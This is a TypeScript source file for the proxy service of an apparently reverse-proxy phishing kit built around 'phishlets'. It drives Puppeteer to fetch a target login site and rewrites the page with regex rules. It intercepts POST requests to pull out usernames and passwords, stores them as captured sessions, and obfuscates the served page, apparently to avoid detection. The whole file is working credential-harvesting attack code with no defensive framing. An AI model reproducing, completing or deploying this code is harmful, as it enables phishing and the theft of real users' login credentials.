import puppeteer, { Browser } from 'puppeteer';
import JavaScriptObfuscator from 'javascript-obfuscator';
import { Phishlet } from '../entities';
import { AppDataSource } from '../data-source';
import { CapturedSession } from '../entities';

class ProxyService {
    private browser: Browser | null = null;

    async initialize() {
        this.browser = await puppeteer.launch();
    }

    async handleRequest(phishlet: Phishlet): Promise<string> {
        if (!this.browser) {
            await this.initialize();
        }

        const page = await this.browser!.newPage();

        await page.setRequestInterception(true);
        page.on('request', (request) => {
            // Intercept and log requests
            if (request.method() === 'POST') {
                this.captureCredentials(request, phishlet);
            }
            request.continue();
        });

        await page.goto(phishlet.targetUrl, { waitUntil: 'networkidle2' });
        const content = await page.content();
        await page.close();

        const rewrittenContent = this.rewriteContent(content, phishlet);
        return this.obfuscateContent(rewrittenContent);
    }

    private async captureCredentials(request: puppeteer.HTTPRequest, phishlet: Phishlet) {
        const sessionRepo = AppDataSource.getRepository(CapturedSession);
        const postData = request.postData();
        if (postData) {
            const params = new URLSearchParams(postData);
            const username = params.get(phishlet.credSelectors.username);
            const password = params.get(phishlet.credSelectors.password);

            if (username && password) {
                // Simplified session management
                const session = new CapturedSession();
                session.phishletId = phishlet.id;
                session.ipAddress = 'unknown'; // This should be captured from the initial request
                session.capturedData = { username, password };
                await sessionRepo.save(session);
            }
        }
    }

    private rewriteContent(body: string, phishlet: Phishlet): string {
        let rewrittenBody = body;
        if (phishlet.rewriteRules) {
            for (const rule of phishlet.rewriteRules) {
                rewrittenBody = rewrittenBody.replace(new RegExp(rule.from, 'g'), rule.to);
            }
        }
        return rewrittenBody;
    }

    private obfuscateContent(body: string): string {
        const obfuscationResult = JavaScriptObfuscator.obfuscate(body, {
            compact: true,
            controlFlowFlattening: true,
        });
        return obfuscationResult.getObfuscatedCode();
    }
}

export const proxyService = new ProxyService();
